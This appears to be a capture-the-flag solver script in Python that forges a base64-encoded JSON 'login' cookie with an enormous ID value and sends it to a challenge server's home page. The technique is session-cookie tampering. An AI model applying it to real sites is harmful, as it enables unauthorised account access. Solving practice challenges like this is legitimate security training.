import requests
import base64
import random
from bs4 import BeautifulSoup
import math

urlbase = 'http://sn4ck-sh3nan1gans.challs.olicyber.it/'
s = requests.Session()
id_payload ='{''"ID":1'+'0'*922337203 +'}'
#id_str = '{"ID":' + str(140) + '}'
base64_id = base64.b64encode(id_payload.encode('utf-8')).decode('ascii')
s.cookies.update({"login": base64_id})
r=s.get(urlbase + 'home.php')
#print(s.cookies)
print(r.status_code)
print(r.text)
